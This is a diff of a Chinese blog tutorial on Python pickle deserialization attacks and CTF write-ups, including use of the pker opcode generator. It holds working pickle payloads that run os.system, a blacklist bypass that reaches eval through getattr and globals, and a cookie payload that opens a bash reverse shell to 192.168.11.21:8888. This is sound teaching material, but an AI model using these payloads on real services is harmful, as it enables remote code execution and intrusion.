 <li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li>
 <li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li>
 </ul>
-<h4 id="拼接opcode">拼接opcode</h4>
-<p>将第一个pickle流结尾表示结束的 <code>.</code> 去掉，将第二个pickle流与第一个拼接起来即可。</p>
-<h4 id="全局变量覆盖">全局变量覆盖</h4>
-<p>python源码：</p>
+<h4 id="拼接opcode"><a href="#拼接opcode" class="headerlink" title="拼接opcode"></a>拼接opcode</h4><p>将第一个pickle流结尾表示结束的 <code>.</code> 去掉，将第二个pickle流与第一个拼接起来即可。</p>
+<h4 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h4><p>python源码：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># secret.py</span></div><div class="line">name=<span class="string">'TEST3213qkfsmfo'</span></div></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># main.py</span></div><div class="line"><span class="keyword">import</span> pickle</div><div class="line"><span class="keyword">import</span> secret</div><div class="line"></div><div class="line">opcode=<span class="string">'''c__main__</span></div><div class="line"><span class="string">secret</span></div><div class="line"><span class="string">(S'name'</span></div><div class="line"><span class="string">S'1'</span></div><div class="line"><span class="string">db.'''</span></div><div class="line"></div><div class="line">print(<span class="string">'before:'</span>,secret.name)</div><div class="line"></div><div class="line">output=pickle.loads(opcode.encode())</div><div class="line"></div><div class="line">print(<span class="string">'output:'</span>,output)</div><div class="line">print(<span class="string">'after:'</span>,secret.name)</div></pre></td></tr></table></figure>
 <p>首先，通过 <code>c</code> 获取全局变量 <code>secret</code> ，然后建立一个字典，并使用 <code>b</code> 对secret进行属性设置，使用到的payload：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">opcode=<span class="string">'''c__main__</span></div><div class="line"><span class="string">secret</span></div><div class="line"><span class="string">(S'name'</span></div><div class="line"><span class="string">S'1'</span></div><div class="line"><span class="string">db.'''</span></div></pre></td></tr></table></figure>
-<h4 id="函数执行">函数执行</h4>
-<p>与函数执行相关的opcode有三个： <code>R</code> 、 <code>i</code> 、 <code>o</code> ，所以我们可以从三个方向进行构造：</p>
-<ol type="1">
+<h4 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h4><p>与函数执行相关的opcode有三个： <code>R</code> 、 <code>i</code> 、 <code>o</code> ，所以我们可以从三个方向进行构造：</p>
+<ol>
 <li><code>R</code> ：</li>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">b'''cos</span></div><div class="line"><span class="string">system</span></div><div class="line"><span class="string">(S'whoami'</span></div><div class="line"><span class="string">tR.'''</span></div></pre></td></tr></table></figure>
-<ol start="2" type="1">
+<ol start="2">
 <li><code>i</code> ：</li>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">b'''(S'whoami'</span></div><div class="line"><span class="string">ios</span></div><div class="line"><span class="string">system</span></div><div class="line"><span class="string">.'''</span></div></pre></td></tr></table></figure>
-<ol start="3" type="1">
+<ol start="3">
 <li><code>o</code> ：</li>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">b'''(cos</span></div><div class="line"><span class="string">system</span></div><div class="line"><span class="string">S'whoami'</span></div><div class="line"><span class="string">o.'''</span></div></pre></td></tr></table></figure>
-<h4 id="实例化对象">实例化对象</h4>
-<p>实例化对象是一种特殊的函数执行，这里简单的使用 <code>R</code> 构造一下，其他方式类似：</p>
+<h4 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h4><p>实例化对象是一种特殊的函数执行，这里简单的使用 <code>R</code> 构造一下，其他方式类似：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></div><div class="line">        self.name = name</div><div class="line">        self.age = age</div><div class="line"></div><div class="line">data=<span class="string">b'''c__main__</span></div><div class="line"><span class="string">Student</span></div><div class="line"><span class="string">(S'XiaoMing'</span></div><div class="line"><span class="string">S"20"</span></div><div class="line"><span class="string">tR.'''</span></div><div class="line"></div><div class="line">a=pickle.loads(data)</div><div class="line">print(a.name,a.age)</div></pre></td></tr></table></figure>
-<h4 id="pker的使用推荐">pker的使用（推荐）</h4>
-<ul>
-<li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker" class="uri" target="_blank" rel="external">https://github.com/eddieivan01/pker</a>下载源码。解析器的原理见作者的paper：<a href="https://xz.aliyun.com/t/7012" target="_blank" rel="external">通过AST来构造Pickle opcode</a>。</li>
+<h4 id="pker的使用（推荐）"><a href="#pker的使用（推荐）" class="headerlink" title="pker的使用（推荐）"></a>pker的使用（推荐）</h4><ul>
+<li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker" target="_blank" rel="external">https://github.com/eddieivan01/pker</a>下载源码。解析器的原理见作者的paper：<a href="https://xz.aliyun.com/t/7012" target="_blank" rel="external">通过AST来构造Pickle opcode</a>。</li>
 <li>使用pker，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li>
 </ul>
-<h4 id="注意事项">注意事项</h4>
-<p>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：</p>
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># linux(注意posix):</span></div><div class="line"><span class="string">b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</span></div><div class="line"></div><div class="line"><span class="comment"># windows(注意nt):</span></div><div class="line"><span class="string">b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</span></div></pre></td></tr></table></figure>
-<h3 id="ctf实战">CTF实战</h3>
-<h4 id="做题之前了解pickle.unpickler.find_class">做题之前：了解<code>pickle.Unpickler.find_class()</code></h4>
-<p>由于官方针对pickle的安全问题的建议是修改<code>find_class()</code>，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。<br>
-什么时候会调用<code>find_class()</code>：</p>
-<ol type="1">
-<li>从opcode角度看，当出现<code>c</code>、<code>i</code>、<code>b'\x93'</code>时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。</li>
-<li>从python代码来看，<code>find_class()</code>只会在解析opcode时调用一次，所以只要绕过opcode执行过程，<code>find_class()</code>就不会再调用，也就是说<code>find_class()</code>只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过<code>__import__</code>绕过一些黑名单。</li>
+<h3 id="CTF实战"><a href="#CTF实战" class="headerlink" title="CTF实战"></a>CTF实战</h3><h4 id="做题之前：了解pickle-Unpickler-find-class"><a href="#做题之前：了解pickle-Unpickler-find-class" class="headerlink" title="做题之前：了解pickle.Unpickler.find_class()"></a>做题之前：了解<code>pickle.Unpickler.find_class()</code></h4><p>由于官方针对pickle的安全问题的建议是修改<code>find_class()</code>，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。<br>什么时候会调用<code>find_class()</code>：</p>
+<ol>
+<li>从opcode角度看，当出现<code>c</code>、<code>i</code>、<code>b&#39;\x93&#39;</code>时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。</li>
+<li>从python代码来看，<code>find_class()</code>只会在解析opcode时调用一次，所以只要绕过opcode执行过程，<code>find_class()</code>就不会再调用，也就是说<code>find_class()</code>只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过<code>__import__</code>绕过一些黑名单。  </li>
 </ol>
 <p>下面先看两个例子：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">safe_builtins = &#123;<span class="string">'range'</span>,<span class="string">'complex'</span>,<span class="string">'set'</span>,<span class="string">'frozenset'</span>,<span class="string">'slice'</span>,&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></div><div class="line">        <span class="comment"># Only allow safe classes from builtins.</span></div><div class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</div><div class="line">            <span class="keyword">return</span> getattr(builtins, name)</div><div class="line">        <span class="comment"># Forbid everything else.</span></div><div class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %(module, name))</div></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></div><div class="line">        <span class="keyword">if</span> module == <span class="string">'__main__'</span>: <span class="comment"># 只允许__main__模块</span></div><div class="line">            <span class="keyword">return</span> getattr(sys.modules[<span class="string">'__main__'</span>], name)</div><div class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</div></pre></td></tr></table></figure>
 <ul>
-<li>第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为<code>{'range','complex','set','frozenset','slice',}</code>。</li>
+<li>第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为<code>{&#39;range&#39;,&#39;complex&#39;,&#39;set&#39;,&#39;frozenset&#39;,&#39;slice&#39;,}</code>。</li>
 <li>第二个例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许<code>__main__</code>模块。虽然看起来很安全，但是被引入主程序的模块都可以通过<code>__main__</code>调用修改，所以造成了变量覆盖。</li>
 </ul>
-<p>由这两个例子我们了解到，对于开发者而言，使用白名单谨慎列出安全的模块则是规避安全问题的方法；而如何绕过<code>find_class</code>函数内的限制就是pickle反序列化解题的关键。<br>
-此外，CTF中的考察点往往还会结合python的基础知识（往往是内置的模块、属性、函数）进行，考察对白名单模块的熟悉程度，所以做题的时候可以先把白名单模块的文档看一看:)</p>
-<h4 id="code-breakingpicklecode">Code-Breaking:picklecode</h4>
-<p>题目将pickle能够引入的模块限定为<code>builtins</code>，并且设置了子模块黑名单：<code>{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}</code>，于是我们能够<strong>直接</strong>利用的模块有：</p>
+<p>由这两个例子我们了解到，对于开发者而言，使用白名单谨慎列出安全的模块则是规避安全问题的方法；而如何绕过<code>find_class</code>函数内的限制就是pickle反序列化解题的关键。<br>此外，CTF中的考察点往往还会结合python的基础知识（往往是内置的模块、属性、函数）进行，考察对白名单模块的熟悉程度，所以做题的时候可以先把白名单模块的文档看一看:)</p>
+<h4 id="Code-Breaking-picklecode"><a href="#Code-Breaking-picklecode" class="headerlink" title="Code-Breaking:picklecode"></a>Code-Breaking:picklecode</h4><p>题目将pickle能够引入的模块限定为<code>builtins</code>，并且设置了子模块黑名单：<code>{&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}</code>，于是我们能够<strong>直接</strong>利用的模块有：</p>
 <ul>
 <li><code>builtins</code>模块中，黑名单外的子模块。</li>
 <li>已经<code>import</code>的模块：<code>io</code>、<code>builtins</code>（需要先利用<code>builtins</code>模块中的函数）</li>
 </ul>
 <p>黑名单中没有<code>getattr</code>，所以可以通过<code>getattr</code>获取<code>io</code>或<code>builtins</code>的子模块以及子模块的子模块:)，而<code>builtins</code>里有<code>eval、exec</code>等危险函数，即使在黑名单中，也可以通过<code>getattr</code>获得。pickle不能直接获取<code>builtins</code>一级模块，但可以通过<code>builtins.globals()</code>获得<code>builtins</code>；这样就可以执行任意代码了。payload为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="string">b'''cbuiltins</span></div><div class="line"><span class="string">getattr</span></div><div class="line"><span class="string">p0</span></div><div class="line"><span class="string">(cbuiltins</span></div><div class="line"><span class="string">dict</span></div><div class="line"><span class="string">S'get'</span></div><div class="line"><span class="string">tRp1</span></div><div class="line"><span class="string">cbuiltins</span></div><div class="line"><span class="string">globals</span></div><div class="line"><span class="string">)Rp2</span></div><div class="line"><span class="string">00g1</span></div><div class="line"><span class="string">(g2</span></div><div class="line"><span class="string">S'builtins'</span></div><div class="line"><span class="string">tRp3</span></div><div class="line"><span class="string">0g0</span></div><div class="line"><span class="string">(g3</span></div><div class="line"><span class="string">S'eval'</span></div><div class="line"><span class="string">tR(S'__import__("os").system("whoami")'</span></div><div class="line"><span class="string">tR.</span></div><div class="line"><span class="string">'''</span></div></pre></td></tr></table></figure>
-<h4 id="watevrctf-2019pickle-store">watevrCTF-2019:Pickle Store</h4>
-<p>因为题目是黑盒，所以没有黑白名单限制，直接改cookie反弹shell即可。payload：</p>
+<h4 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="watevrCTF-2019:Pickle Store"></a>watevrCTF-2019:Pickle Store</h4><p>因为题目是黑盒，所以没有黑白名单限制，直接改cookie反弹shell即可。payload：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="string">b'''cos</span></div><div class="line"><span class="string">system</span></div><div class="line"><span class="string">(S"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.11.21/8888 0&gt;&amp;1'"</span></div><div class="line"><span class="string">tR.</span></div><div class="line"><span class="string">'''</span></div></pre></td></tr></table></figure>
-<h4 id="高校战疫网络安全分享赛webtmp">高校战疫网络安全分享赛:webtmp</h4>
-<p>限制中，改写了<code>find_class</code>函数，只能生成<code>__main__</code>模块的pickle：</p>
+<h4 id="高校战疫网络安全分享赛-webtmp"><a href="#高校战疫网络安全分享赛-webtmp" class="headerlink" title="高校战疫网络安全分享赛:webtmp"></a>高校战疫网络安全分享赛:webtmp</h4><p>限制中，改写了<code>find_class</code>函数，只能生成<code>__main__</code>模块的pickle：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></div><div class="line">        <span class="keyword">if</span> module == <span class="string">'__main__'</span>: <span class="comment"># 只允许__main__模块</span></div><div class="line">            <span class="keyword">return</span> getattr(sys.modules[<span class="string">'__main__'</span>], name)</div><div class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</div></pre></td></tr></table></figure>
-<p>此外，禁止了<code>b'R'</code>：</p>
+<p>此外，禁止了<code>b&#39;R&#39;</code>：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span>:</div><div class="line">    pickle_data = request.form.get(<span class="string">'data'</span>)</div><div class="line">    <span class="keyword">if</span> <span class="string">b'R'</span> <span class="keyword">in</span> base64.b64decode(pickle_data): </div><div class="line">        <span class="keyword">return</span> <span class="string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span></div></pre></td></tr></table></figure>
 <p>目标是覆盖secret中的验证，由于secret被主程序引入，是存在于<code>__main__</code>下的secret模块中的，所以可以直接覆盖掉，此时就成功绕过了限制：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="string">b'''c__main__</span></div><div class="line"><span class="string">secret</span></div><div class="line"><span class="string">(S'name'</span></div><div class="line"><span class="string">S"1"</span></div><div class="line"><span class="string">S"category"</span></div><div class="line"><span class="string">S"2"</span></div><div class="line"><span class="string">db0(S"1"</span></div><div class="line"><span class="string">S"2"</span></div><div class="line"><span class="string">i__main__</span></div><div class="line"><span class="string">Animal</span></div><div class="line"><span class="string">.'''</span></div></pre></td></tr></table></figure>
 <p>除了以上这些题外，还有BalsnCTF:pyshv1-v3和SUCTF-2019:guess_game四道题，由于手动写还是比较麻烦，在后文中使用pker工具完成。</p>
-<h2 id="pker使用说明">pker使用说明</h2>
-<h3 id="简介">简介</h3>
-<ul>
-<li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker" class="uri" target="_blank" rel="external">https://github.com/eddieivan01/pker</a>下载源码。</li>
+<h2 id="pker使用说明"><a href="#pker使用说明" class="headerlink" title="pker使用说明"></a>pker使用说明</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul>
+<li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker" target="_blank" rel="external">https://github.com/eddieivan01/pker</a>下载源码。</li>
 <li>使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。</li>
 <li>再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li>
 <li>此外，pker的实现用到了python的ast（抽象语法树）库，抽象语法树也是一个很重要东西，有兴趣的可以研究一下ast库和pker的源码，由于篇幅限制，这里不再叙述。</li>
 </ul>
-<h3 id="pker能做的事">pker能做的事</h3>
-<p>引用自<a href="https://xz.aliyun.com/t/7012#toc-5" class="uri" target="_blank" rel="external">https://xz.aliyun.com/t/7012#toc-5</a>：</p>
+<h3 id="pker能做的事"><a href="#pker能做的事" class="headerlink" title="pker能做的事"></a>pker能做的事</h3><p>引用自<a href="https://xz.aliyun.com/t/7012#toc-5" target="_blank" rel="external">https://xz.aliyun.com/t/7012#toc-5</a>：</p>
 <blockquote>
 <ul>
 <li>变量赋值：存到memo中，保存memo下标和变量名即可</li>
@@ -724,23 +694,21 @@ I | INTEGER | Integer | I42|<br>
 </ul>
 </blockquote>
 <p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p>
-<h3 id="使用方法与示例">使用方法与示例</h3>
-<ol type="1">
+<h3 id="使用方法与示例"><a href="#使用方法与示例" class="headerlink" title="使用方法与示例"></a>使用方法与示例</h3><ol>
 <li>pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）</li>
 <li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li>
 <li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">以下module都可以是包含`.`的子module</div><div class="line">调用函数时，注意传入的参数类型要和示例一致</div><div class="line">对应的opcode会被生成，但并不与pker代码相互等价</div><div class="line"></div><div class="line">GLOBAL</div><div class="line">对应opcode：<span class="string">b'c'</span></div><div class="line">获取module下的一个全局对象（没有<span class="keyword">import</span>的也可以，比如下面的os）：</div><div class="line">GLOBAL(<span class="string">'os'</span>, <span class="string">'system'</span>)</div><div class="line">输入：module,instance(callable、module都是instance)  </div><div class="line"></div><div class="line">INST</div><div class="line">对应opcode：<span class="string">b'i'</span></div><div class="line">建立并入栈一个对象（可以执行一个函数）：</div><div class="line">INST(<span class="string">'os'</span>, <span class="string">'system'</span>, <span class="string">'ls'</span>)  </div><div class="line">输入：module,callable,para </div><div class="line"></div><div class="line">OBJ</div><div class="line">对应opcode：<span class="string">b'o'</span></div><div class="line">建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：</div><div class="line">OBJ(GLOBAL(<span class="string">'os'</span>, <span class="string">'system'</span>), <span class="string">'ls'</span>) </div><div class="line">输入：callable,para</div><div class="line"></div><div class="line">xxx(xx,...)</div><div class="line">对应opcode：<span class="string">b'R'</span></div><div class="line">使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）</div><div class="line"></div><div class="line">li[<span class="number">0</span>]=<span class="number">321</span></div><div class="line">或</div><div class="line">globals_dic[<span class="string">'local_var'</span>]=<span class="string">'hello'</span></div><div class="line">对应opcode：<span class="string">b's'</span></div><div class="line">更新列表或字典的某项的值</div><div class="line"></div><div class="line">xx.attr=<span class="number">123</span></div><div class="line">对应opcode：<span class="string">b'b'</span></div><div class="line">对xx对象进行属性设置</div><div class="line"></div><div class="line"><span class="keyword">return</span></div><div class="line">对应opcode：<span class="string">b'0'</span></div><div class="line">出栈（作为pickle.loads函数的返回值）：</div><div class="line"><span class="keyword">return</span> xxx <span class="comment"># 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）</span></div></pre></td></tr></table></figure>
 <p>注意：</p>
-<ol type="1">
+<ol>
 <li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li>
 <li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">test=<span class="string">"123"</span></div><div class="line"><span class="keyword">return</span> test</div></pre></td></tr></table></figure>
 <p>被解析为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">b"S'123'\np0\n0g0\n."</span></div></pre></td></tr></table></figure>
-<h4 id="pker全局变量覆盖">pker：全局变量覆盖</h4>
-<ul>
+<h4 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h4><ul>
 <li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">secret=GLOBAL(<span class="string">'__main__'</span>, <span class="string">'secret'</span>) </div><div class="line"><span class="comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span></div><div class="line">secret.name=<span class="string">'1'</span></div><div class="line">secret.category=<span class="string">'2'</span></div></pre></td></tr></table></figure>
@@ -749,25 +717,23 @@ I | INTEGER | Integer | I42|<br>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">game = GLOBAL(<span class="string">'guess_game'</span>, <span class="string">'game'</span>)</div><div class="line">game.curr_ticket = <span class="string">'123'</span></div></pre></td></tr></table></figure>
 <p>接下来会给出一些具体的基本操作的实例。</p>
-<h4 id="pker函数执行">pker：函数执行</h4>
-<ul>
-<li>通过<code>b'R'</code>调用：</li>
+<h4 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h4><ul>
+<li>通过<code>b&#39;R&#39;</code>调用：</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">s=<span class="string">'whoami'</span></div><div class="line">system = GLOBAL(<span class="string">'os'</span>, <span class="string">'system'</span>)</div><div class="line">system(s) <span class="comment"># `b'R'`调用</span></div><div class="line"><span class="keyword">return</span></div></pre></td></tr></table></figure>
 <ul>
-<li>通过<code>b'i'</code>调用：</li>
+<li>通过<code>b&#39;i&#39;</code>调用：</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INST(<span class="string">'os'</span>, <span class="string">'system'</span>, <span class="string">'whoami'</span>)</div></pre></td></tr></table></figure>
 <ul>
-<li>通过<code>b'c'</code>与<code>b'o'</code>调用：</li>
+<li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">OBJ(GLOBAL(<span class="string">'os'</span>, <span class="string">'system'</span>), <span class="string">'whoami'</span>)</div></pre></td></tr></table></figure>
 <ul>
 <li>多参数调用函数</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">INST(<span class="string">'[module]'</span>, <span class="string">'[callable]'</span>[, par0,par1...])</div><div class="line">OBJ(GLOBAL(<span class="string">'[module]'</span>, <span class="string">'[callable]'</span>)[, par0,par1...])</div></pre></td></tr></table></figure>
-<h4 id="pker实例化对象">pker：实例化对象</h4>
-<ul>
+<h4 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h4><ul>
 <li>实例化对象是一种特殊的函数执行</li>
 </ul>
